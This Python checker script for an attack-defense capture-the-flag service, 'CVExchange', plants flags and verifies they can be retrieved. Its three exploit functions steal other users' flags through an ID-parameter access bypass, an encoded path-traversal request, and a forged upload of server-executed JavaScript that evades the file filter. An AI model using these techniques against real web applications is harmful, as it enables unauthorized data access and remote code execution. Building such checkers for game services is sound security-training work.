from typing import Optional #type checking / optional parameters i.e. a function may or may not return a str
from httpx import AsyncClient, Request #client for http requests
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    InternalErrorException
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from bs4 import BeautifulSoup
import random
import string
import base64


SERVICE_PORT = 1337
checker = Enochecker("CVExchange", SERVICE_PORT)
app = lambda: checker.app


def parseCookie(cookieString):
    start = cookieString.find('jwtToken=') + len('jwtToken=')
    end = cookieString.find(' ', start)
    if end == -1:
        end = len(cookieString)
    return cookieString[start:end]


async def register(client: AsyncClient):
    name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=3))
    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
    assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")
    cookie = parseCookie(str(client.cookies))

    # scour the frontpage to retrieve our unique userId
    profileResp = await client.get("/", cookies={"jwtToken": cookie}) 
    html = BeautifulSoup(profileResp, "html.parser")
    userClass = html.find('span', attrs={'class':'user'})
    profileLink = userClass.find('a')
    userId = profileLink['href'].split('/')[-1]

    return email, password, cookie, userId


async def login(email: str, password: str, client: AsyncClient):
    loginResp = await client.post("/user/login", json={"email": email, "password": password})
    assert_equals(loginResp.status_code, 302, "couldn't login with userdata")
    cookie = parseCookie(str(client.cookies))
    
    # scour the frontpage to retrieve our unique userId
    profileResp = await client.get("/", cookies={"jwtToken": cookie}) 
    html = BeautifulSoup(profileResp, "html.parser")
    userClass = html.find('span', attrs={'class':'user'})
    profileLink = userClass.find('a')
    userId = profileLink['href'].split('/')[-1]

    return userId, cookie


@checker.putflag(0)
async def putflag_note(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:

    # register so client has a cookie 
    email, password, cookie, userId = await register(client)
    await db.set("userinfo", (email, password) )
    
    # deposit the flag as the users personal note
    uploadResp = await client.post("/user/editnote", json={"text": task.flag}, cookies={"jwtToken": cookie})
    assert_equals(uploadResp.status_code, 302, "couldn't store flag under /user/editnote")

    return userId


@checker.putflag(1)
async def putflag_private(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
   
    # register so client has a cookie 
    email, password, cookie, userId = await register(client)
    await db.set("userinfo", (email, password) )

    # create a .txt file containing the flag and upload it to /files/private
    with open('flag.txt', 'w') as flagFile:
        flagFile.write(task.flag)

    uploadResp = await client.post('/files/private', files={"privateFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
    assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/private")

    return userId


@checker.putflag(2)
async def putflag_backup(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
   
    # register so client has a cookie 
    email, password, cookie, userId = await register(client)
    await db.set("userinfo", (email, password) )

    # create a .txt file containing the flag and upload it to /files/backup
    with open('flag.txt', 'w') as flagFile:
        flagFile.write(task.flag)

    uploadResp = await client.post('/files/backup', files={"backupFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
    assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/backup")

    return userId


@checker.getflag(0)
async def getflag_note(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:

    # retrieve login data from the DB
    try:
        email, password = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")
    
    # login with registration data from putflag(0)
    userId, cookie = await login(email, password, client)

    # now that we have the userId we visit our profile page and find the flag
    flagResp = await client.get(f"/user/profile/{userId}", cookies={"jwtToken": cookie})
    assert_equals(flagResp.status_code, 200, "couldn't get profile page containing the flag")
    assert_in(task.flag, flagResp.text, "flag not found on profile page")


@checker.getflag(1)
async def getflag_private(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    
    # retrieve login data from the DB
    try:
        email, password = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")
    
    # login with registration data from putflag(1)
    userId, cookie = await login(email, password, client)
    
    # visit the users private upload directory to find the flag 
    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/private/flag.txt", cookies={"jwtToken": cookie})
    assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from private directory")
    assert_in(task.flag, flagResp.text, "flag not found in private directory")


@checker.getflag(2)
async def getflag_backup(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    
    # retrieve login data from the DB
    try:
        email, password = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")
    
    # login with registration data from putflag(2)
    userId, cookie = await login(email, password, client)
    
    # visit the users backup directory to retrieve the flag
    flagResp = await client.get(f"/files/retrieve/{base64.b64encode(userId.encode()).decode()}/flag.txt", cookies={"jwtToken": cookie})
    assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from backup directory")
    assert_in(task.flag, flagResp.text, "flag not found in backup directory")


@checker.exploit(0)
async def exploit_note(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:

    # retrieve userId from attackinfo
    if(task.attack_info == ""):
        raise InternalErrorException("Attack info is empty")
    victimUserId = task.attack_info

    # register so client has a cookie 
    email, password, cookie, userId = await register(client)

    # exploit
    flagResp = await client.get(f"/user/profile/{victimUserId}?userId={victimUserId}", cookies={"jwtToken": cookie})
    assert_equals(flagResp.status_code, 200, "couldn't load profile page with flag")

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag


@checker.exploit(1)
async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:

    # retrieve userId from attackinfo
    if(task.attack_info == ""):
        raise InternalErrorException("Attack info is empty")
    victimUserId = task.attack_info

    # register so client has a cookie 
    email, password, cookie, userId = await register(client)

    # exploit
    flagResp = await client.get(f"/uploads/{base64.b64encode(victimUserId.encode()).decode()}%2Fpublic%2F..%2Fprivate%2Fflag.txt", cookies={"jwtToken": cookie})
    assert_equals(flagResp.status_code, 200, "couldn't load flag from private directory")

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag
    

@checker.exploit(2)
async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:

    # retrieve userId from attackinfo
    if(task.attack_info == ""):
        raise InternalErrorException("Attack info is empty")
    victimUserId = task.attack_info

    # register so client has a cookie 
    email, password, cookie, userId = await register(client)

    # create a file containing js that will be executed on server side to reveal the users flag
    with open('getflag.jpg.js', 'w') as getFlag:
        getFlag.write(f"""const fs = require('fs');
                            const path = require('path'); 
                            const flagPath = path.join(__dirname, '../../../backups', '{base64.b64encode(victimUserId.encode()).decode()}', 'flag.txt');
                            function readFlagFile() {{
                                try {{
                                    const flag = fs.readFileSync(flagPath, 'utf8');
                                    return flag;
                                }} catch (error) {{
                                    return 'Failed to read flag file';
                                }}
                            }}
                            const result = readFlagFile();
                            result;""" )
    
    # add the content-type header to the file
    with open('getflag.jpg.js', 'rb') as file:
        data = file.read()
    payload = b"Content-Type: image/jpeg\r\n\r\n" + data
    
    # create a request for a file upload
    request = Request("POST", f"http://{task.address}:{SERVICE_PORT}/files/upload", files={"profilePicture": payload}, cookies={"jwtToken": cookie})
    
    # copy the headers for our actual request 
    headers = {}
    for header, value in request.headers.items():
        headers[header] = value
    
    # replace the original content-type of the request and the filename and also adjust the content-length header
    betterRequest = request.read().replace(b'Content-Type: application/octet-stream\r\n\r\n', b'')
    betterRequest = betterRequest.replace(b'filename="upload"', b'filename="getflag.jpg.js"')
    
    length = headers['content-length']
    newLength = int(length) - 34
    headers['content-length'] = str(newLength)

    # upload the file to our public upload directory, bypassing server side filters
    uploadResp = await client.post('/files/upload', headers=headers , content=betterRequest)
    assert_equals(uploadResp.status_code, 302, "couldn't upload exploit to /files/upload")

    # the file gets evaluated on server side and we should get the flag in the response
    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js", cookies={"jwtToken": cookie})
    assert_equals(flagResp.status_code, 200, f"couldn't retrieve flag via /uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js")

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag